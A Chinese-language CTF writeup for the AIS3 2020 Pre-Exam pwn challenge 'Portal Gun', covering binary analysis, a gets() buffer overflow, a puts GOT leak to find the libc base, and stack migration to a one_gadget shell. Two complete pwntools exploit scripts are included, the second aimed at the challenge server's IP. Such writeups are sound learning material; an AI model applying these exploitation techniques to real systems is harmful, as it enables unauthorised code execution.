---
title: "AIS3 2020 Pre-Exam CTF pwn Portal Gun writeup"
date: 2020-06-20T15:42:33+08:00
categories: ["writeup"]
tags: ["CTF", "pwn"]
draft: false
---

# AIS3 2020 Pre-Exam CTF Portal Gun Writeup

Author: Sophie Shin <br>
Time: 2020/06/10 10:00 A.M. <br>
為了配合AIS3要抽選手繳交 wirteup，就延後發文了

## 前言
2019 第一次參加 MyFirstCTF 之後有幸錄取 AIS3 課程，便開始入坑 pwn <br>
在那之前完全沒碰過組合語言，計算機組織也直到今年(大三）才修，<br>
入坑一開始極其痛苦，發現很多觀念還沒學得很扎實，便開始看原文書《Computer Systems. A Programmer’s Perspective》，並且參與台灣好厲駭計畫，聆聽線上課程資源。　<br>

去年只解出 BOF，今年的 pwn 很幸運的解出了 3 題，也靠 pwn 才足以進 Pre-Exam 前一百名，但還是有待加強！ <br>
Portal Gun 應該是我至今解過算是很有挑戰的題目 (等級還不足XD)，就認真寫了 Writeup <br>

## 使用的分析工具
* GDB-peda
* objdump
* readelf
* ROPgadget
* onegadget
* r2

## 流程
1. 使用 `file` 指令觀察： <br>
	* 此檔案的使用何種 ISA ，x86 還是 x86-64 ?
	* 是否是 dynamic linking?
![](https://i.imgur.com/GFuMQix.png)

2. 接著使用 `checksec` 指令 (GDB-peda 有內建也可以使用) <br>

![](https://i.imgur.com/ZYovs2c.png)

發現檔案並沒有開啟 *Canary* 保護

3. 使用 r2 工具來觀察程式的行為 <br>
可以看到，程式會做 `gets var_70h` ，而 `var_70h` 儲存在 `rbp-0x70` ，因此可以朝 BOF 的方向下手
![](https://i.imgur.com/A3o0LvH.png)

此題透過 `objdump` 或 `r2` 觀察後發現，裡面有 import `system()` 函式，因此可先以 Buffer overflow 的手法來 hook `system()`

![](https://i.imgur.com/VpQr8yq.png)

* 使用 `objdump -d -M intel ./portal_gun | less` 來觀察整個程式行為 <br>
objdump 工具的方便在於，可直接觀察整個程式的流程，並且可透過搜尋或 `grep` 的方式，來直接判斷是否有可用的**進入點**，例如是否有 import `system()`，或是呼叫 `system("/bin/sh")` 等。

![](https://i.imgur.com/uIYenhP.png)

嘗試寫了腳本，在本地端確實成功地執行 shell !
```python=
from pwn import *

offset = 0x70
call_sys = 0x4006e8
payload = 'a'*offset + p64(call_sys)
p = process("./portal_gun")
#p = remote("60.250.197.227", 10002)
p.recvline()
p.recvline()
p.sendline(payload)
p.interactive()
p.close()
```

![](https://i.imgur.com/pC44vSW.png)

以為這樣就能成功，但是... Hook Dection! <br>

![](https://i.imgur.com/FIbWdTG.png)

仔細思考，題目除了給 `portal gun` 檔案，還給了 `libc.so.6` 和 `hook.so` <br>

使用 `r2` 觀察 `hook.so` 裡 `system()` 被呼叫的行為，只有單純印出 `** system function hook **` 就 return 了，也就是說 **此題的 `portal_gun` 有將 `system()` 的程式行為竄改過，因為引入了 `hook.so` 的 `system()` 來使用** <br>

因此，我們必須使用 `libc.so.6` 計算出 *C library base address* 來取得 *shell*，難度頓時增加許多。 <br>

4. 計算 *library base address* <br>
使用 `readelf -a libc.so.6 | grep "puts"` 來找出 `puts()` 在 `libc.so.6` 的 offset

![](https://i.imgur.com/xgZzo3L.png)

再透過 BOF 的手法來使用 gets 函數，<br>
使用 `ROPgadget --binary portal_gun | grep "pop rdi.*ret$"` 找出可用的 gadget `pop rdi ; ret` 後，便可在 return 到 `puts()` 前，放入 `puts_got` 的位址，之後在 return 到 `puts()` 時，便能 leak 出 puts 在程式實際執行的位址，計算出實際的 *library base address*<br>

![](https://i.imgur.com/IaC9Www.png)

計算出 base 位址後，使用 `onegadget libc.so.6` 找出執行 `execve("/bin/sh", 0, 0);` 的 offset，加上 base 之後，即實際的執行位址 (變動的)

5. return gets()，使用 ROP 手法輸入 gadgets <br>
使用 `pop rdi ; ret` 這個 gadget，放入 data section 的位址 (要寫入的位址)，在 return 到 `gets()` 時，就會再次將 payload 輸入到 data section 中 <br>

並使用 `leave; ret` 的 gadget ，來達到 *stack migration* 的手法，將 stack pointer 挪到 data section 使用，以便執行一連串的手法來執行 shell

解法如下：
```python=
from pwn import *

puts_got = 0x601018
libc_puts = 0x0809c0
one_gadget = 0x4f322
call_puts = 0x400560
call_gets = 0x400580
main = 0x400720
offset = 0x70 # 0x70+8 to return
data_sec = 0x601040
pop_rdi = 0x4007a3 # pop rdi ; ret
ret = 0x400291 # ret
pop_rbp = 0x400608 # pop rbp ; ret
leave = 0x40073b # leave ; ret

#p = process("./portal_gun")
p = remote("60.250.197.227", 10002)

p.recvline()
p.recvline()
payload = 'a'*offset + p64(data_sec) + p64(pop_rdi) + p64(puts_got) + p64(call_puts) 
payload += p64(pop_rdi) + p64(data_sec) + p64(call_gets)
payload += p64(leave) + p64(data_sec) + p64(leave)
p.sendline(payload)

# leak
leak_addr = p.recvline()
puts_run_address = u64(leak_addr[:-1].ljust(8, "\x00")) # u64
print(hex(puts_run_address))
base = puts_run_address - libc_puts
call_shell = base + one_gadget

# input payload in data section
payload = p64(call_shell) + p64(ret) + p64(ret) + p64(call_shell)
p.sendline(payload)
p.interactive()
p.close()
```